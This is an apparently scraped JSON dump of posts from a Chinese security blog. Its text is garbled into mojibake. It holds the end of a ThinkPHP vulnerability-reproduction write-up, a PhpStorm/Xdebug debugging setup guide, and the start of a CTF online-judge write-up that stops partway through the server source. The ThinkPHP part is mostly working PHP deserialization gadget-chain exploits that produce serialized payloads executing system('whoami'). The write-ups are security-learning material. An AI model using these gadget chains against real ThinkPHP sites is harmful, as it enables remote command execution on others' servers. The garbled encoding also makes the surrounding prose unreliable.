=\u0026gt; $name) { $this-\u0026gt;appendAttrToArray($item, $key, $name, $visible, $hidden); } ..............ç­‰ä»£ç  } è¿™é‡Œä¸»è¦ä¸»è¦å°±æ˜¯è¦è°ƒç”¨æœ€åçš„appendAttrToArray()æ–¹æ³•ï¼š\nç„¶åè°ƒç”¨è¿™é‡Œçš„getRelationWith()æ–¹æ³•ï¼š\nè¿™é‡Œå°±å¯ä»¥è§¦å‘__call()æ–¹æ³•ï¼Œå¯¹äºå‚æ•°çš„ä¼ é€’ï¼Œå…¶å®ä¸éš¾ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹æ²¡æƒ³æ˜ç™½ï¼š\nè¿™é‡Œçš„ruleä¼šæ˜¯ä»€ä¹ˆï¼Ÿé—®æˆ‘ä¼ å‚æ—¶å¹¶æ²¡æœ‰ä¼ è¿™ä¸ªå‚æ•°ï¼Œå…ˆç®€å•æ„é€ çœ‹çœ‹è¿™é‡Œçš„å‚æ•°æ˜¯ä»€ä¹ˆã€‚\nexpæ„é€  é—®é¢˜è¯´æ˜ è¿™é‡Œçš„å‚æ•°è¯´æ˜å°±ä¸å…·ä½“è¯´æ˜äº†ï¼Œç›´æ¥æ„é€ å³å¯ï¼Œå®åœ¨æƒ³ä¸å‡ºçš„æ—¶å€™å¯ä»¥å†çœ‹çœ‹Pæˆ‘æ„é€ å‡ºæ¥çš„POCï¼Œè¿™é‡Œæœ‰å‡ ä¸ªç‚¹éœ€è¦è¯´æ˜ä¸€ä¸‹ï¼š\n1.\nåœ¨å‰é¢çš„é“¾å­æ‰¾å¯»è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥çŸ¥é“é“¾å­å…¶ä¸­ä¸€ä¸ªæ˜¯traitç±»å‹çš„Conversionç±»ï¼Œæ˜¯ä»£ç å¤ç”¨ç±»å‹çš„ï¼Œä¸èƒ½ç›´æ¥å®ä¾‹åŒ–æ¥ä½¿ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦åˆ©ç”¨åˆ°ä»–çš„__toString()æ–¹æ³•ï¼Œæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Œè‡ªå·±æ„é€ çš„æ—¶å€™ä¹Ÿæ˜¯åœ¨Conversionç±»ä¸­æœ‰ä¸€ä¸ªå‘ä¸‹æ‰¾çš„æŒ‰é’®ï¼š\nå¾€ä¸‹è·³ï¼Œåˆ°äº†ModelæŠ½è±¡ç±»:\nå†å¾€ä¸‹å°±åˆ°äº†Pivotç±»ï¼š\nè¿™ä¸ªç±»å°±æ˜¯å¯ä»¥ç›´æ¥å®ä¾‹åŒ–æ¥ä½¿ç”¨çš„ï¼Œæ‰€ä»¥æœ€åæˆ‘ä»¬è¦ä½¿ç”¨çš„ç±»å°±æ˜¯è¿™ä¸ªç±»ã€‚\nâ€”â€”â€”â€”â€”â€”\n2.\nè¿˜æœ‰ä¸ªå°±æ˜¯å‰é¢é—ç•™çš„$ruleå‚æ•°é—®é¢˜ï¼š\næœç„¶è¿˜æ˜¯è°ƒè¯•ä¸€ä¸‹å°±çŸ¥é“äº†ï¼Œè¿™é‡Œçš„$ruleå˜é‡çš„å€¼æ˜¯visibleï¼Œåé¢ç®€å•è¯´è¯´æ˜¯æ€ä¹ˆè¿›è¡Œçš„ï¼š\nåœ¨__callæ–¹æ³•ä¸­ï¼Œè§¦å‘çš„ç‚¹æ˜¯visible()æ–¹æ³•ï¼š\næ‰€ä»¥å¦‚ä¸‹__callæºç ï¼Œè¿™é‡Œä¼šç›´æ¥å°†è¿™ä¸ª$methodçš„å€¼ç›´æ¥pushä¸Šæ•°ç»„ä¸­ï¼š\nè®©ç„¶ååœ¨è°ƒç”¨is()å‡½æ•°æ—¶ï¼Œå¯¹äº$valueå’Œ$ruleçš„å€¼ï¼Œå°±æ˜¯æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼å’Œç¬¬äºŒä¸ªå€¼ã€‚\n3.\næœ€é‡è¦çš„ä¸€ç‚¹ï¼Œniviaå¸ˆå‚…tqlï¼Œä¹Ÿæ˜¯æˆ‘å¡ä½çš„ä¸€ç‚¹ï¼Œå¯¼è‡´è¿™ä¸€æ­¥æ²¡æ„é€ å‡ºPOCï¼Œç®€å•è´´ä¸€ä¸‹æˆ‘çš„åŸæœ¬é”™è¯¯çš„POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 \u0026lt;?php namespace think; class Validate { protected $type = []; function __construct(){ $this-\u0026gt;type=[\u0026#39;visible\u0026#39;=\u0026gt;\u0026#39;system\u0026#39;]; } } class Route{ } namespace think\\model; class Pivot { protected $visible = []; protected $hidden = []; protected $append = []; private $relation = []; function __construct(){ $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; \u0026#34;fupanc.whoami\u0026#34; ]; $this-\u0026gt;hidden=[ \u0026#39;113\u0026#39;=\u0026gt;true ]; $this-\u0026gt;append=[ \u0026#34;fupanc\u0026#34;=\u0026gt;\u0026#34;fupanc.111111\u0026#34; ]; $this-\u0026gt;relation=[ \u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\Validate() ]; } } namespace think\\route; class Resource { protected $rule; protected $option = []; protected $rest = []; protected $router; protected $name; function __construct(){ $this-\u0026gt;rule=\u0026#34;fupanc\u0026#34;; $this-\u0026gt;router=new \\think\\Route(); $this-\u0026gt;option=[ \u0026#34;var\u0026#34;=\u0026gt;[\u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\model\\Pivot()], ]; $this-\u0026gt;rest = [ \u0026#39;fupanc\u0026#39; =\u0026gt; [\u0026#34;111\u0026#34;,\u0026#34;\u0026lt;id\u0026gt;\u0026#34;] ]; $this-\u0026gt;name=\u0026#34;f\u0026#34;; } } namespace think\\route; class ResourceRegister { protected $registered; protected $resource; protected $name; function __construct(){ $this-\u0026gt;registered = false; $this-\u0026gt;name=\u0026#34;f\u0026#34;; $this-\u0026gt;resource=new \\think\\route\\Resource(); } } $a=new \\think\\route\\ResourceRegister(); echo urlencode(base64_encode(serialize($a))); å¯ä»¥åŠ¨æ€ç”Ÿæˆè°ƒè¯•ä¸€ä¸‹ã€‚\nå°±ç®€å•è¯´è¯´è¿™é‡Œçš„å·®é”™ç‚¹ï¼š\nåŒæ ·çš„ï¼Œæˆ‘ä¹Ÿæ˜¯å…³æ³¨åˆ°äº†åœ¨toArray()æ–¹æ³•ä¸­çš„å¯¹$this-\u0026gt;visibleçš„åˆ†å‰²ï¼ŒåŒæ ·çš„æœ€å¼€å§‹æ„é€ æ˜¯æ˜¯æƒ³è¦åˆ©ç”¨elseè¯­å¥ä¸­çš„ä»£ç å—æ¥è¿›è¡Œèµ‹å€¼æ“ä½œï¼š\nä½†æ˜¯åœ¨å‚æ•°è·Ÿè¿›ä¸­ï¼Œå‘ç°è¿™é‡Œæ˜¯éœ€è¦å°†è¿™ä¸ª$valè®¾ç½®ä¸ºå‘½ä»¤æ‰§è¡Œçš„å‚æ•°ï¼Œæ¯”å¦‚whoamiï¼Œä½†æ˜¯è¿™é‡Œå°±ä¸€å®šä¼šæ˜¯å­—ç¬¦ä¸²ç±»å‹çš„ï¼Œå°±ä¸€å®šä¸èƒ½æˆåŠŸè°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘å‰é¢çš„POCæ„é€ å°±é¡ºåº”è¶‹åŠ¿ï¼Œå°è¯•å¯¹ifä¸­çš„è¯­å¥è¿›è¡Œåˆ©ç”¨ï¼Œæ‰€ä»¥éœ€è¦æœ‰.ï¼Œè®©ç„¶å$nameçš„å€¼ä¸ºå‘½ä»¤æ‰§è¡Œå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä¼ å‚\n1 2 3 $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; \u0026#34;fupanc.whoami\u0026#34; ]; è¿™æ ·å°±èƒ½å½¢æˆä¸€ä¸ª$visible['fupanc'][] = \u0026quot;whoami\u0026quot;äº†ï¼Œåœ¨æœ€åçš„è°ƒç”¨call()æ–¹æ³•æ—¶ï¼Œè¿™é‡Œçš„å‚æ•°å°±æ˜¯ä¼ é€’çš„è¿™ä¸ªï¼š\nä½†æ˜¯å‘€ä½†æ˜¯ï¼Œé¡ºåº”ifè¯­å¥çš„åæœæ˜¯ï¼Œé‡Œé¢æ˜¯ä¸€å±‚æ•°ç»„ï¼ˆä¹Ÿå°±æ˜¯ä¼šç”Ÿæˆä¸Šé¢ç»™çš„ç¤ºä¾‹çš„ç»“æœï¼‰ï¼š\næœ¬æ¥æˆ‘è¿˜å¾ˆå…´å¥‹ï¼Œåˆšå¥½call_user_func_array()å‡½æ•°ç¬¬äºŒä¸ªå°±æ˜¯éœ€è¦ä¸€ä¸ªæ•°ç»„ç±»å‹ï¼Œä½†æ˜¯ï¼Œåœ¨çœŸæ­£è°ƒç”¨æ—¶ï¼Œæ˜¯åœ¨å¤–é¢å¥—äº†ä¸€å±‚æ•°ç»„çš„ï¼š\næ‰€ä»¥è¿™é‡ŒçœŸæ­£è°ƒç”¨æ—¶æ˜¯ä¼šæŠ¥é”™çš„ï¼š\næ‰€ä»¥è¿™é‡Œæ˜¯å¤±è´¥çš„ã€‚è¿˜æ˜¯å¿…é¡»è¦è¿›å…¥åˆ°elseä¸­çš„è¯­å¥å‘€ï¼Œè¿™æ ·æ‰èƒ½èµ‹å€¼ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹ï¼Œä»è€Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯ä¸€ç›´æƒ³ä¸é€šå‘€ï¼Œæ€ä¹ˆå¯ä»¥è¿™æ ·è¿›è¡Œå‘¢ï¼Ÿ\næœ€åè¿˜æ˜¯çœ‹çš„niviaå­¦é•¿çš„æ–‡ç« ï¼Œé‡Œé¢æœ‰å¦‚ä¸‹è¯´æ³•ï¼š\næˆ‘æœ€å¼€å§‹ä¹Ÿæ˜¯çœ‹ä¸æ‡‚çš„ï¼Œé€šè¿‡çœ‹POCä»¥åŠå†™ä»£ç ï¼Œç»ˆäºç†è§£åˆ°äº†ã€‚\nåœ¨è¿™é‡Œniviaå­¦é•¿å°±æ˜¯å°†$valè®¾ç½®ä¸ºäº†ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œç„¶ååœ¨å‡½æ•°è°ƒç”¨æ—¶ä¼šè§¦å‘toString()å‡½æ•°ï¼Œä»è€Œè¾“å‡ºè¿™ä¸ªå†…å®¹ï¼Œä½†æ˜¯ä¹Ÿæ˜¯ä¸€ç›´æ²¡æƒ³æ¸…æ¥šæ˜¯å“ªé‡Œè°ƒç”¨äº†è§¦å‘äº†toString()æ–¹æ³•ï¼Œåé¢æƒ³åˆ°äº†å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œéœ€è¦stringç±»å‹ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½æ˜¯è¿™ä¸ªç‚¹ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class Student{ function __toString(){ return \u0026#34;whoami\u0026#34;; } } $a=new Student(); call_user_func_array(\u0026#34;system\u0026#34;,[$a]); æœ€åæˆåŠŸè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚æˆåŠŸï¼Œé‚£ä¹ˆå°±æ˜¯è¿™æ ·è¿›è¡Œçš„ã€‚\nå¹¶ä¸”ï¼Œè¿™é‡Œéå¸¸éå¸¸é‡è¦çš„æ˜¯ï¼Œè¿˜åˆšå¥½æœ‰ä¸€ä¸ªç±»çš„toString()å‡½æ•°æ˜¯ç¬¦åˆè¿™ä¸ªæ¡ä»¶çš„ï¼š\ntoString()å‡½æ•°å†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 public function __toString(): string { return (string) $this-\u0026gt;value; } å“‡å¡ï¼Œå¤ªç¬¦åˆäº†ï¼Œæ€ä¹ˆå°±ä¼šæœ‰è¿™ä¹ˆå·§çš„æƒ…å†µå‡ºç°ï¼Œtqlï¼Œåˆå­¦åˆ°ä¸€ä¸ªæ–°çš„åˆ©ç”¨ç‚¹ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\næœ€ç»ˆPOC å®Œäº‹å…·å¤‡ï¼Œæœ€åçš„å®Œæ•´POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 \u0026lt;?php namespace Symfony\\Component\\VarDumper\\Caster; class ConstStub{ protected $value; function __construct(){ $this-\u0026gt;value=\u0026#34;whoami\u0026#34;; } } namespace think; class Validate { protected $type = []; function __construct(){ $this-\u0026gt;type=[\u0026#39;visible\u0026#39;=\u0026gt;\u0026#39;system\u0026#39;]; } } class Route{ } namespace think\\model; class Pivot { protected $visible = []; protected $hidden = []; protected $append = []; private $relation = []; function __construct(){ $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; new \\Symfony\\Component\\VarDumper\\Caster\\ConstStub ]; $this-\u0026gt;hidden=[ \u0026#39;113\u0026#39;=\u0026gt;true ]; $this-\u0026gt;append=[ \u0026#34;fupanc\u0026#34;=\u0026gt;\u0026#34;fupanc.111111\u0026#34; ]; $this-\u0026gt;relation=[ \u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\Validate() ]; } } namespace think\\route; class Resource { protected $rule; protected $option = []; protected $rest = []; protected $router; protected $name; function __construct(){ $this-\u0026gt;rule=\u0026#34;fupanc\u0026#34;; $this-\u0026gt;router=new \\think\\Route(); $this-\u0026gt;option=[ \u0026#34;var\u0026#34;=\u0026gt;[\u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\model\\Pivot()], ]; $this-\u0026gt;rest = [ \u0026#39;fupanc\u0026#39; =\u0026gt; [\u0026#34;111\u0026#34;,\u0026#34;\u0026lt;id\u0026gt;\u0026#34;] ]; $this-\u0026gt;name=\u0026#34;f\u0026#34;; } } namespace think\\route; class ResourceRegister { protected $registered; protected $resource; protected $name; function __construct(){ $this-\u0026gt;registered = false; $this-\u0026gt;name=\u0026#34;f\u0026#34;; $this-\u0026gt;resource=new \\think\\route\\Resource(); } } $a=new \\think\\route\\ResourceRegister(); echo urlencode(base64_encode(serialize($a))); æˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š\nç®€å•ä¼˜åŒ–äº†ä¸€ä¸‹POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 \u0026lt;?php namespace Symfony\\Component\\VarDumper\\Caster; class ConstStub{ protected $value; function __construct(){ $this-\u0026gt;value=\u0026#34;whoami\u0026#34;; } } namespace think; class Validate { protected $type = []; function __construct(){ $this-\u0026gt;type=[\u0026#39;visible\u0026#39;=\u0026gt;\u0026#39;system\u0026#39;]; } } class Route{ } namespace think\\model; class Pivot { protected $visible = []; protected $hidden = []; protected $append = []; private $relation = []; function __construct(){ $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; new \\Symfony\\Component\\VarDumper\\Caster\\ConstStub ]; $this-\u0026gt;hidden=[ \u0026#39;113\u0026#39;=\u0026gt;true ]; $this-\u0026gt;append=[ \u0026#34;fupanc\u0026#34;=\u0026gt;\u0026#34;fupanc.111111\u0026#34; ]; $this-\u0026gt;relation=[ \u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\Validate() ]; } } namespace think\\route; class Resource { protected $rule; protected $option = []; protected $rest = []; protected $router; protected $name; function __construct(){ $this-\u0026gt;rule=\u0026#34;fupanc\u0026#34;; $this-\u0026gt;router=new \\think\\Route(); $this-\u0026gt;option=[ \u0026#34;var\u0026#34;=\u0026gt;[\u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\model\\Pivot()], ]; $this-\u0026gt;rest = [ \u0026#39;fupanc\u0026#39; =\u0026gt; [\u0026#34;111\u0026#34;,\u0026#34;\u0026lt;id\u0026gt;\u0026#34;] ]; $this-\u0026gt;name=\u0026#34;f\u0026#34;; } } namespace think\\route; class ResourceRegister { protected $registered; protected $resource; protected $name; function __construct(){ $this-\u0026gt;resource=new \\think\\route\\Resource(); } } $a=new \\think\\route\\ResourceRegister(); echo urlencode(base64_encode(serialize($a))); â€”â€”â€”â€”â€”â€”\næ€»ç»“ interstingï¼Œvery interstingï¼Œä¸€åˆ‡éƒ½æ˜¯æœ€å¥½çš„å®‰æ’ï¼Œå¥½ç©å¥½ç©ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/news/14341\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nThinkphpçš„æ¼æ´è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œå…¶ä»–çš„å°±ä¸å¤ç°äº†ï¼Œè¿˜æƒ³å†å¤ç°çš„å¯ä»¥åœ¨æ¼æ´åº“æ‰¾æ‰¾ã€‚\næ³¨ï¼šæ¯ä¸€éƒ¨åˆ†çš„å‚è€ƒæ–‡ç« éƒ½æ˜¯ä¸åŒçš„ã€‚\n","date":"2025-03-07T22:09:04+08:00","permalink":"https://fupanc-w1n.github.io/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"ThinkPHPæ¼æ´å¤ç°"},{"content":"phpstormè¿œç¨‹è°ƒè¯•ç¯å¢ƒæ­å»º æ­å»ºå·¥å…·éœ€æ±‚ï¼šphpstorm+phpstudy\nè¿‡ç¨‹è¯´æ˜ é¦–å…ˆæ˜¯åœ¨phpstudyæ­å»ºä¸€ä¸ªç½‘ç«™ï¼Œç„¶ååœ¨æ‰©å±•é‡Œé€‰ä¸Šxdebugï¼š\nå¯ä»¥å†™ä¸€ä¸ªphpinfo()å›æ˜¾é¡µé¢ï¼Œç„¶åå…¨éƒ¨èµ‹å€¼ç²˜è´´æ‹¿åˆ°xdebugå®˜æ–¹é¡µé¢æ¥å¯»æ±‚é€‚é…çš„xdebugç‰ˆæœ¬ï¼š\nä¸‹è½½ç»™çš„æ–‡ä»¶ï¼Œç„¶åå°†å…¶æ”¹åä¸ºphp_xdebug.dllå¹¶æ”¾åœ¨extç›®å½•ä¸‹ã€‚\nå†ç„¶åä¿®æ”¹ä¸€ä¸‹php.iniå†…å®¹ï¼Œè¿™é‡Œèµ°äº†å¾ˆå¤šå‘ï¼Œå¦‚ä¸‹å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 [Xdebug] zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll xdebug.log=D:/phpstudy_pro/xdebug.log xdebug.mode=debug; xdebug.remote_handler=\u0026#34;dbgp\u0026#34; xdebug.start_with_request = yes xdebug.discover_client_host = yes xdebug.client_host = localhost xdebug.client_port = 62649 xdebug.idekey=\u0026#34;PHPSTORM\u0026#34; æ³¨æ„ä¸€ä¸‹xdebug2å’Œxdebug3çš„åŒºåˆ«ï¼Œæˆ‘è¿™é‡Œæ˜¯xdebug3ã€‚ç„¶åå°±æ˜¯é…ç½®phpstormäº†ï¼š\nåœ¨è®¾ç½®çš„debugéƒ¨åˆ†ï¼š\nä¸€å®šè¦å¼€å¯ä¾¦å¬ï¼Œç„¶åè¿™é‡Œçš„ç«¯å£éœ€è¦ä¸å‰é¢é…ç½®æ–‡ä»¶ä¸­çš„client_portç›¸åŒã€‚\nç„¶åé…ç½®DBGpä»£ç†ï¼š\nç„¶åé…ç½®ä¸€ä¸ªæœåŠ¡å™¨ï¼š\nè¿™é‡Œçš„ä¸»æœºå¯ä»¥éšä¾¿å¡«ï¼Œä½†æ˜¯ç«¯å£å°±éœ€è¦å’Œphpstudyä¸Šçš„ä¸€æ ·ã€‚ç„¶åç¼–è¾‘é…ç½®ï¼š\nåŠ ä¸€ä¸ªPHPç½‘é¡µï¼š\nå¯ä»¥ç‚¹å‡»éªŒè¯æ¥éªŒè¯ä¸€ä¸‹ï¼š\nç„¶åæ‰“ä¸€ä¸ªæ–­ç‚¹å°±å¯ä»¥å¼€å§‹è°ƒè¯•äº†ï¼š\nè°ƒè¯•è¶…æ—¶è§£å†³æ–¹æ³•ï¼š\n1.php.iniéœ€è¦è®¾ç½®xdebugå’Œmac_execution_timeç­‰ï¼Œæ¥å¢åŠ ç­‰å¾…æ—¶é—´ï¼š\n1 2 3 4 5 # è¶…æ—¶æ—¶é—´æ”¹å¤§ä¸€ç‚¹ xdebug.remote_cookie_expire_time = 7200 max_execution_time=7200 max_input_time=7200 default_socket_timeout = 7200 2.ä¿®æ”¹apacheçš„é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œå°±è´´ä¸€ä¸‹æˆ‘åŠ çš„ä¸€äº›é…ç½®ï¼š\nä¿®æ”¹httpd.confï¼šå°†ä¸‹é¢è¿™è¡Œçš„å‰é¢çš„æ³¨é‡Šå»æ‰ï¼š\n1 Include conf/extra/httpd-default.conf ç„¶åæ·»åŠ å¦‚ä¸‹ä¸€è¡Œï¼š\n1 Include conf/extra/httpd-fcgid.conf å¹¶ä¸”åœ¨æœ€ååŠ ä¸Šå¦‚ä¸‹å†…å®¹\n1 2 3 4 5 6 # è¶…æ—¶æ—¶é—´æ”¹å¤§ä¸€ç‚¹ Timeout 7200 FcgidIOTimeout 7200 FcgidIdleTimeout 7200 IPCConnectTimeout 7200 IPCCommTimeout 7200 ç„¶ååœ¨conf\\extra\\httpd-default.confé‡Œä¿®æ”¹ï¼Œä¿®æ”¹æ–‡æ¡£å†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # # Timeout: The number of seconds before receives and sends time out. # Timeout 7200 # # KeepAlive: Whether or not to allow persistent connections (more than # one request per connection). Set to \u0026#34;Off\u0026#34; to deactivate. # KeepAlive On # # MaxKeepAliveRequests: The maximum number of requests to allow # during a persistent connection. Set to 0 to allow an unlimited amount. # We recommend you leave this number high, for maximum performance. # MaxKeepAliveRequests 0 # # KeepAliveTimeout: Number of seconds to wait for the next request from the # same client on the same connection. # KeepAliveTimeout 7200 æœ€ååœ¨apache\\conf\\extraç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªhttpd-fcgid.confæ–‡ä»¶ï¼ŒåŠ å…¥å¦‚ä¸‹å†…å®¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ProcessLifeTime 7200 FcgidIOTimeout 7200 FcgidConnectTimeout 7200 FcgidOutputBufferSize 128 FcgidMaxRequestsPerProcess 1000 FcgidMinProcessesPerClass 0 FcgidMaxProcesses 16 FcgidMaxRequestLen 268435456 FcgidInitialEnv PHP_FCGI_MAX_REQUESTS 1000 IPCConnectTimeout 7200 IPCCommTimeout 7200 FcgidIdleTimeout 7200 FcgidBusyTimeout 60000 FcgidBusyScanInterval 120 FcgidInitialEnv PHPRC \u0026#34;D:\\phpstudy_pro\\Extensions\\php\\php7.4.3nts\u0026#34; AddHandler fcgid-script .php phpè·¯å¾„è‡ªå·±ä¿®æ”¹ï¼Œç„¶åå¦‚æœè¿˜æƒ³æ”¹æ—¶é—´æ›´é•¿çš„è¯å°±æ˜¯æ”¹ä¸Šé¢çš„7200è¿™ä¸ªæ•°å­—ã€‚\næœ€åé‡å¯ä¸€ä¸‹apacheå³å¯ï¼Œåº”è¯¥å°±æ˜¯å¯ä»¥äº†ã€‚\næ˜“å‘ç‚¹ å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„ç‚¹å§ï¼Œä¹Ÿæœ‰äº›æ˜¯è¿™é‡Œæƒ³ç€é‡è¯´æ˜çš„ï¼š\næ¯æ¬¡ä¿®æ”¹php.iniæ–‡ä»¶ï¼Œéƒ½æ˜¯éœ€è¦é‡å¯ä¸€æ¬¡æœåŠ¡çš„ã€‚ç›´æ¥åœ¨phpstudyä¸Šçš„apacheå“ªé‡Œé‡å¯å°±è¡Œäº†ã€‚ å¦‚æœæœ‰å‡ ä¸ªç¯å¢ƒï¼Œæ¯”å¦‚phpstudyä¸Šåˆ›å»ºäº†å‡ ä¸ªç½‘ç«™ï¼Œææ··äº†å°±æ¯”è¾ƒéº»çƒ¦ï¼Œåœ¨éªŒè¯è¿™é‡Œæˆ‘æ˜¯å¡äº†å¾ˆä¹…çš„ã€‚å¦‚æœæŒ‰ç…§å‰é¢çš„æ“ä½œï¼Œåœ¨æœ€åéªŒè¯çš„é‚£ä¸€æ­¥å‡ºç°äº†ä»€ä¹ˆç«¯å£ç¹å¿™ç­‰ç­‰é—®é¢˜ï¼Œå…³æ‰å…¶ä»–ç½‘ç«™ï¼Œç„¶åé‡å¯ç”µè„‘å†æ¬¡å°è¯•ã€‚ å‚è€ƒæ–‡ç« ï¼š\nhttps://www.cnblogs.com/gaorenyusi/p/18213773\nhttps://blog.csdn.net/kelleo/article/details/135215408\nhttps://blog.csdn.net/weixin_43888304/article/details/120802226\nhttps://xdebug.org/docs/upgrade_guide#changed-xdebug.remote_autostart\n","date":"2025-03-02T16:11:22+08:00","permalink":"https://fupanc-w1n.github.io/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"phpstormè¿œç¨‹è°ƒè¯•ç¯å¢ƒæ­å»º"},{"content":"WEB ezoj å•Šï¼Ÿæ€ä¹ˆæ•´ä¸ªäº”ä¸ªç®—æ³•é¢˜ç»™CTFé€‰æ‰‹åšï¼Ÿï¼Ÿè¿™æˆ‘ä¸å¾—ä¸å±•ç¤ºä¸€ä¸‹çœŸæ­£çš„æŠ€æœ¯æŠŠæµ‹è¯„æœºæ‰“ç©¿ã€‚ é¢˜ç›®ç¯å¢ƒä¸å‡ºç½‘ã€‚\nâ€”â€”â€”â€”â€”â€”\nå¼€é¢˜å°±æ˜¯å‡ ä¸ªç®—æ³•é¢˜ï¼Œåœ¨é¡µé¢ä¸‹æ–¹çœ‹åˆ°\nè®¿é—®sourceè·¯ç”±æ‹¿åˆ°æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 import os import subprocess import uuid import json from flask import Flask, request, jsonify, send_file from pathlib import Path app = Flask(__name__) SUBMISSIONS_PATH = Path(\u0026#34;./submissions\u0026#34;) PROBLEMS_PATH = Path(\u0026#34;./problems\u0026#34;) SUBMISSIONS_PATH.mkdir(parents=True, exist_ok=True) CODE_TEMPLATE = \u0026#34;\u0026#34;\u0026#34; import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) \u0026#34;\u0026#34;\u0026#34; class OJTimeLimitExceed(Exception): pass class OJRuntimeError(Exception): pass @app.route(\u0026#34;/\u0026#34;) def index(): return send_file(\u0026#34;static/index.html\u0026#34;) @app.route(\u0026#34;/source\u0026#34;) def source(): return send_file(\u0026#34;server.py\u0026#34;) @app.route(\u0026#34;/api/problems\u0026#34;) def list_problems(): problems_dir = PROBLEMS_PATH problems = [] for problem in problems_dir.iterdir(): problem_config_file = problem / \u0026#34;problem.json\u0026#34; if not problem_config_file.exists(): continue problem_config = json.load(problem_config_file.open(\u0026#34;r\u0026#34;)) problem = { \u0026#34;problem_id\u0026#34;: problem.name, \u0026#34;name\u0026#34;: problem_config[\u0026#34;name\u0026#34;], \u0026#34;description\u0026#34;: problem_config[\u0026#34;description\u0026#34;], } problems.append(problem) problems = sorted(problems, key=lambda x: x[\u0026#34;problem_id\u0026#34;]) problems = {\u0026#34;problems\u0026#34;: problems} return jsonify(problems), 200 @app.route(\u0026#34;/api/submit\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def submit_code(): try: data = request.get_json() code = data.get(\u0026#34;code\u0026#34;) problem_id = data.get(\u0026#34;problem_id\u0026#34;) if code is None or problem_id is None: return ( jsonify({\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Missing \u0026#39;code\u0026#39; or \u0026#39;problem_id\u0026#39;\u0026#34;}), 400, ) problem_id = str(int(problem_id)) problem_dir = PROBLEMS_PATH / problem_id if not problem_dir.exists(): return ( jsonify( {\u0026#34;status\u0026#34;: 